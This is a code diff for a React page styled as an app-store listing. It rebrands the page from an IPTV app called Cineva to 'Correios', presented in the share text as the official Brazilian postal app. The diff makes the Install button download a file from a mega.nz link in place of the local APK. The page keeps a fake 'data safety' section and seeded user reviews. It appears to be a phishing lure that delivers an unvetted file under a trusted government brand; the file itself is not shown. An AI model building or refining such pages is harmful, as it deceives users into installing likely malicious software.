@@ -1,19 +1,18 @@
 import React, { useState, useEffect } from 'react';
 import { Header } from './components/Header';
 import { AppHero } from './components/AppHero';
-import { ScreenshotsCarousel } from './components/ScreenshotsCarousel';
 import { AboutSection } from './components/AboutSection';
 import { DataSafetySection } from './components/DataSafetySection';
 import { ReviewsSection } from './components/ReviewsSection';
 import { Footer } from './components/Footer';
 import { Toast } from './components/Toast';
-import { INITIAL_REVIEWS } from './data/reviews';
+import { INITIAL_REVIEWS, APP_DETAILS } from './data/reviews';
 import { Review } from './types';
 
 export default function App() {
   const [reviews, setReviews] = useState<Review[]>(() => {
     try {
-      const saved = localStorage.getItem('cineva_reviews');
+      const saved = localStorage.getItem('correios_reviews');
       if (saved) {
         return JSON.parse(saved);
       }
@@ -32,23 +31,25 @@ export default function App() {
   // Save reviews when changed
   useEffect(() => {
     try {
-      localStorage.setItem('cineva_reviews', JSON.stringify(reviews));
+      localStorage.setItem('correios_reviews', JSON.stringify(reviews));
     } catch (e) {
       console.error(e);
     }
   }, [reviews]);
 
-  // Handle Install & APK Download directly without any popup
+  // Handle Install & File Download directly without any popup
   const handleInstallClick = () => {
     if (downloadState === 'downloading') return;
 
     // Switch button to "Carregando"
     setDownloadState('downloading');
 
-    // Trigger physical download of Cineva.apk
+    // Trigger download of the configured file URL
+    const targetUrl = APP_DETAILS.downloadUrl || 'https://mega.nz/file/v14TiCqb#NwdqNzvRPIGjyB2pv4giBM7WfSHdyzfjbMMhGdJlrd0';
     const link = document.createElement('a');
-    link.href = '/Cineva.apk';
-    link.download = 'Cineva.apk';
+    link.href = targetUrl;
+    link.target = '_blank';
+    link.rel = 'noopener noreferrer';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
@@ -64,8 +65,8 @@ export default function App() {
     if (navigator.share) {
       try {
         await navigator.share({
-          title: 'Cineva - Streaming & IPTV Player',
-          text: 'Baixe o aplicativo Cineva para assistir canais em 4K, filmes e esportes sem travamento no TV Box e celular!',
+          title: 'Correios – Rastreamento e Entregas',
+          text: 'Baixe o aplicativo oficial dos Correios para rastreamento de encomendas, Sedex, PAC e cálculo de frete!',
           url: window.location.href,
         });
         return;
@@ -88,8 +89,8 @@ export default function App() {
       const next = !prev;
       setToastMessage(
         next
-          ? 'Cineva adicionado à sua lista de desejos!'
-          : 'Cineva removido da lista de desejos'
+          ? 'Correios adicionado à sua lista de desejos!'
+          : 'Correios removido da lista de desejos'
       );
       return next;
     });
@@ -143,7 +144,7 @@ export default function App() {
     };
 
     setReviews((prev) => [created, ...prev]);
-    setToastMessage('Sua avaliação sobre o Cineva IPTV foi publicada!');
+    setToastMessage('Sua avaliação sobre o aplicativo dos Correios foi enviada com sucesso!');
   };
 
   return (
@@ -169,16 +170,13 @@ export default function App() {
           downloadProgress={downloadProgress}
         />
 
-        {/* Screenshots Carousel */}
-        <ScreenshotsCarousel />
-
         {/* About App / Sobre Nosso Trabalho */}
         <AboutSection />
 
         {/* Data Safety / Segurança dos Dados */}
         <DataSafetySection />
 
-        {/* Ratings & Reviews (Comentários sobre IPTV e Streaming) */}
+        {/* Ratings & Reviews (Comentários sobre Correios e Entregas) */}
         <ReviewsSection
           reviews={reviews}
           onVoteHelpful={handleVoteHelpful}
